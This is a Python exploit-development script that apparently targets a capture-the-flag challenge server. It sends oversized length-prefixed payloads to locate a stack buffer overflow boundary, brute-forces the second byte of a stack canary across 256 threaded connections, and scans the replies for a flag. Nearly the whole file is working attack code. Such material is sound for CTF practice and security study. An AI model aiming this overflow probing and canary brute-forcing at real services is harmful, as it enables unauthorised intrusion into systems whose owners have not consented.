#!/usr/bin/env python3
import socket,struct,time,concurrent.futures,collections,re,os,random
HOST,PORT="0.cloud.chals.io",27813
FLAG=re.compile(rb"isfcr\{[^}\r\n]{1,200}\}")
def probe(payload,timeout=1.0):
    b=b""; closed=False; err=""
    try:
        with socket.create_connection((HOST,PORT),timeout=4) as s:
            s.settimeout(.15)
            s.sendall(struct.pack(">H",len(payload))+payload)
            t=time.monotonic()+timeout
            while time.monotonic()<t:
                try:
                    c=s.recv(8192)
                    if not c:closed=True;break
                    b+=c
                    if b"logged " in b or b"isfcr{" in b:break
                except socket.timeout:continue
                except OSError as e: closed=True;err=str(e);break
    except OSError as e:err=str(e)
    m=re.search(rb"logged (\d+)\.",b)
    return "ACK" if m and int(m.group(1))==len(payload) else "CLOSED" if closed else "ERR" if err else "SILENT",b,err
def show(name,payload,timeout=1.0):
    state,out,err=probe(payload,timeout)
    print(name,len(payload),state,repr(out[:300]),err,flush=True)
    f=FLAG.search(out)
    if f: print("*** FLAG ***",repr(f.group()),flush=True)
    return state
print("START",time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()),flush=True)
show("base",b"PING")
show("88A",b"A"*88)
show("89A",b"A"*89)
show("89NULL",b"A"*88+b"\x00")
show("90NUL",b"A"*88+b"\x00\x00")
show("90AA",b"A"*88+b"AA")
show("95NUL",b"A"*88+b"\x00"*7)
show("96NUL",b"A"*88+b"\x00"*8)
for n in [91,92,93,94,95,96,97,103,104,105]:
    show("null-tail-"+str(n),b"A"*88+b"\0"*(n-88),.4)
# Test the canary second byte with fresh independent connections; do not overwhelm the service.
def trial(x):
    st,out,err=probe(b"A"*88+b"\x00"+bytes([x]),0.65)
    f=FLAG.search(out)
    if f:print("*** FLAG ***",repr(f.group()),flush=True)
    return x,st,repr(out[:160]),err
counts=collections.Counter(); matches=[]
with concurrent.futures.ThreadPoolExecutor(max_workers=4) as pool:
    for x,st,out,err in pool.map(trial,range(256)):
        counts[st]+=1
        if st=="ACK":
            matches.append(x)
            print("CANDIDATE",x,st,out,flush=True)
print("BYTE1_COUNTS",dict(counts),"matches",matches,flush=True)
for x in matches:
    print("RETEST",x,[trial(x)[1] for _ in range(5)],flush=True)
for k in range(5):
    show("post-baseline-"+str(k),b"A"*88+b"\x00")
print("DONE",flush=True)
